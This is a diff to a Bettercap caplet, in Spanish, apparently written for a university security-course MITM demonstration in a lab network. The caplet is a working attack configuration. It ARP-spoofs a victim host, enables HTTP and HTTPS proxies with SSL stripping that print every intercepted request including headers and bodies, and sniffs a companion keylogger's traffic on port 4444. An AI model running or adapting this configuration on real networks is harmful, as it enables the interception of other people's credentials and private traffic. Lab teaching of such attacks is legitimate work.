@@ -1,24 +1,34 @@
 # mitm_demo.cap
-# Caplet de Bettercap para demostración MITM
+# Caplet de Bettercap MEJORADO para demostración MITM
 # Proyecto U2 - Seguridad Informática
 #
 # Uso (en ParrotMITM 10.0.4.5):
 #   sudo sysctl -w net.ipv4.ip_forward=1
-#   sudo bettercap -iface enp0s3 -caplet mitm_demo.cap
+#   sudo bettercap -iface enp0s3 -caplet keylogger/mitm_demo.cap
+#
+# Terminales adicionales recomendadas:
+#   Terminal 2: sudo python3 keylogger/mitm_payload_monitor.py
+#   Terminal 3: sudo tcpdump -i enp0s3 tcp port 4444 -X -n
 
-# 1. Descubrir hosts en la red
+# ── 1. Descubrir hosts en la red ──────────────────────────────────────────────
 net.probe on
 
-# 2. Configurar ARP Spoofing hacia Ubuntu (víctima)
+# ── 2. ARP Spoofing hacia la víctima ─────────────────────────────────────────
 set arp.spoof.targets 10.0.4.8
 set arp.spoof.fullduplex true
-
-# 3. Activar ARP Spoofing
 arp.spoof on
 
-# 4. Filtrar solo tráfico del keylogger (puerto 4444)
+# ── 3. Proxy HTTP — intercepta GET/POST/PUT/DELETE/PATCH con headers y body ──
+# El script mitm_http.js imprime en pantalla cada petición completa
+set http.proxy.script keylogger/mitm_http.js
+http.proxy on
+
+# ── 4. Proxy HTTPS — igual que HTTP pero con SSL stripping ───────────────────
+set https.proxy.script keylogger/mitm_http.js
+https.proxy on
+
+# ── 5. Sniff tráfico TCP puerto 4444 (payload cifrado del keylogger) ─────────
+# verbose true muestra el volcado hex de cada paquete interceptado
 set net.sniff.filter tcp port 4444
 set net.sniff.verbose true
-
-# 5. Iniciar captura
 net.sniff on
